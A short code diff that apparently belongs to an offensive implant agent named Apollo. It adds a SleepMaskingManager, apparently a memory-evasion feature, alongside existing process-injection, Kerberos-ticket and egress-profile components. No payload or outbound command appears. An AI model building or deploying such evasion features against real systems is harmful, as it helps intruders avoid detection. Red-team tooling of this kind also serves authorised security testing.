@@ -9,6 +9,7 @@ using Microsoft.Win32;
 using System.Net.NetworkInformation;
 using System.Collections.Generic;
 using System.IO;
+using ApolloInterop.Classes.Core;
 
 namespace Apollo.Agent
 {
@@ -28,6 +29,7 @@ namespace Apollo.Agent
             ProcessManager = new Process.ProcessManager(this);
             InjectionManager = new Injection.InjectionManager(this);
             TicketManager = new KerberosTickets.KerberosTicketManager(this);
+            SleepMaskingManager = new SleepMaskingManager(this);
             
 
             foreach (string profileName in Config.EgressProfiles.Keys)
